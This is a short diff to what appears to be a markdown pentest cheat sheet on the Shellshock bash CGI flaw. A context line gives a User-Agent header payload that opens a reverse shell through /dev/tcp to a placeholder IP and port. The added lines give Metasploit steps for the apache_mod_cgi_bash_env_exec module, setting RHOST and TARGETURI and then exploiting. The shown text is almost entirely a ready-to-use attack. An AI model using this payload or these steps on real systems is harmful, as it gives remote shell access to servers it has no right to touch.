@@ -52,6 +52,14 @@ User-Agent:() { :; }; echo; /bin/bash -c 'bash -i>&/dev/tcp/IP/PORT 0>&1'
 msf> use exploit/multi/http/apache_mod_cgi_bash_env_exec
 ```
 
+2. Set RHOST, TARGETURI...
+```bash
+msf> set RHOST TARGET
+msf> set TARGETURI PATH_TO_CGI.cgi
+```
+
+3. Exploit
+
 ---
 #### Definitions
 
